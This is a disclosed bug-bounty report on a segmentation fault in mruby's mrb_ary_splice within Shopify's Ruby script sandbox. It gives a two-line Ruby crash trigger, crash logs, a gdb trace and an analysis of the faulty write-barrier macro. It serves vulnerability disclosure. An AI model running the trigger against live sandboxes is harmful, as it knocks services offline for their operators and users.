# SIGSEV on mrb_ary_splice

## Report Details
- **Report ID**: 182027
- **URL**: https://hackerone.com/reports/182027
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-14T09:03:18.376Z
- **Disclosed**: 2016-12-17T02:30:17.988Z

## Reporter
- **Username**: jpenalbae
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
## Sample
The following code causes a SIGSEV when executed under the sandbox
```
t0me=methods
t0me[0,0]=t0me
```

## Crash
Here we can see the crash (full crash output attached)
```
$ bin/sandbox /tmp/mrb_ary_splice-crash.rb
bin/sandbox:21: [BUG] Segmentation fault at 0x00005200000004
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:0010a8 EVAL   bin/sandbox:21 [FINISH]
c:0001 p:0000 s:0002 E:0024b0 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:21:in `<main>'
bin/sandbox:21:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007ff2a22bcf58 RBP: 0x0000000000000028 RSP: 0x00007ff2a0e2aa20
 RAX: 0x00007ff2a0e8c6f0 RBX: 0x0000000000000005 RCX: 0x0000000000000001
 RDX: 0x0000005200000004 RDI: 0x00007ff2a0e2c4e0 RSI: 0x00007ff2a0e34550
  R8: 0x00007ff2a0e2c000  R9: 0x00007ff2a0e8c900 R10: 0x0000000000000004
 R11: 0x0000000000000000 R12: 0x0000000000000084 R13: 0x0000000000000042
 R14: 0x00007ff2a0e34550 R15: 0x00007ff2a0e4d940 EFL: 0x0000000000010246

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a65c4ea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a65c50dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a649f364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a6550dbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7ff2a6223ed0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_splice+0x108) [0x7ff2a22bcf58] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/boxing_word.h:83
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_aset+0x177) [0x7ff2a22be337] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:789
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7ff2a22c3cf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7ff2a22c9567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7ff2a229d173] ../../../../ext/mruby_engine/eval_monitored.c:68
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7ff2a621a464]
/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7ff2a559630d]
```

## Crash debug
```
(gdb) r
Starting program: /usr/bin/ruby bin/sandbox /tmp/mrb_ary_splice-crash.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 5511)]
[New Thread 0x7ffff2348700 (LWP 5565)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2348700 (LWP 5565)]
mrb_ary_splice (mrb=mrb@entry=0x7ffff23494e0, ary=ary@entry=..., head=<optimized out>, len=<optimized out>, len@entry=0, rpl=...)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:615
615         mrb_field_write_barrier_value(mrb, (struct RBasic*)a, argv[i]);
(gdb) x/2i $rip
=> 0x7ffff37d9f58 <mrb_ary_splice+264>: cmp    BYTE PTR [rdx],0x5
   0x7ffff37d9f5b <mrb_ary_splice+267>: jbe    0x7ffff37d9f24 <mrb_ary_splice+212>
(gdb) i r rdx
rdx            0x5200000004     352187318276
(gdb) list *($rip)
0x7ffff37d9f58 is in mrb_ary_splice (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:615).
610         value_move(a->ptr + head + argc, a->ptr + tail, a->len - tail);
611       }
612
613       for (i = 0; i < argc; i++) {
614         *(a->ptr + head + i) = *(argv + i);
615         mrb_field_write_barrier_value(mrb, (struct RBasic*)a, argv[i]);
616       }
617
618       a->len = size;
619
(gdb)
```

`mrb_field_write_barrier_value` macro equals to:
```c
#define mrb_field_write_barrier_value(mrb, obj, val) do{\
  if (!mrb_immediate_p(val)) mrb_field_write_barrier((mrb), (obj), mrb_basic_ptr(val)); \
} while (0)
```

`mrb_immediate_p` macro equals to:
```c
#define mrb_immediate_p(x) (mrb_type(x) < MRB_TT_HAS_BASIC)  // <-- Bug happens here
```

`mrb_type()` code:
```c
static inline enum mrb_vtype
mrb_type(mrb_value o)
{
  switch (o.w) {
  case MRB_Qfalse:
  case MRB_Qnil:
    return MRB_TT_FALSE;
  case MRB_Qtrue:
    return MRB_TT_TRUE;
  case MRB_Qundef:
    return MRB_TT_UNDEF;
  }
  if (o.value.i_flag == MRB_FIXNUM_FLAG) {
    return MRB_TT_FIXNUM;
  }
  if (o.value.sym_flag == MRB_SYMBOL_FLAG) {
    return MRB_TT_SYMBOL;
  }
  return o.value.bp->tt;
}
```

The bug happens once `mrb_type()` returns and `mrb_immediate_p` macro tries to compare against `MRB_TT_HAS_BASIC`.

## Impact
DoS of the service running the ruby sandbox. Does not look like that this could lead to remote code execution, but I would not discard it if the value of `argv[i]` could be controlled by the user.

## Attachments
- mrb_ary_splice-crash.rb
- mrb_ary_splice-crash.log
